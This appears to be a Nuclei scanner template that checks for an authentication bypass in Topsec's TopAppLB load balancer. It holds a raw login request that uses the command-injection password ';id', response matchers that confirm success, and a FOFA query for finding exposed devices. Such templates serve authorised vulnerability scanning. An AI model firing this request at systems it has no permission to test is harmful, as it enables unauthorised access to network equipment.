http:
- matchers:
  - condition: and
    dsl:
    - status_code_1 == 302 && status_code_2 == 200
    - contains(body_2,"var IsHeadMin ")
    - contains(header_1,"redirect.php") && !contains(tolower(header_1), "error=1")
    type: dsl
  raw:
  - 'POST /login_check.php  HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    userName=admin&password=%3Bid

    '
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
id: topsec-topapplb-auth-bypass
info:
  author: SleepingBag945
  description: 'Topsec TopAppLB is vulnerable to authetication bypass .Enter any account
    on the login page, the password is `;id`.

    '
  metadata:
    fofa-query: "title=\"TopApp-LB \u8D1F\u8F7D\u5747\u8861\u7CFB\u7EDF\""
    max-request: 2
    verified: true
  name: Topsec TopAppLB - Authentication Bypass
  reference:
  - https://github.com/cqr-cryeye-forks/goby-pocs/blob/main/Topsec-TopAppLB-Any-account-Login.json
  severity: high
  tags: topsec,topapplb,auth-bypass,vuln
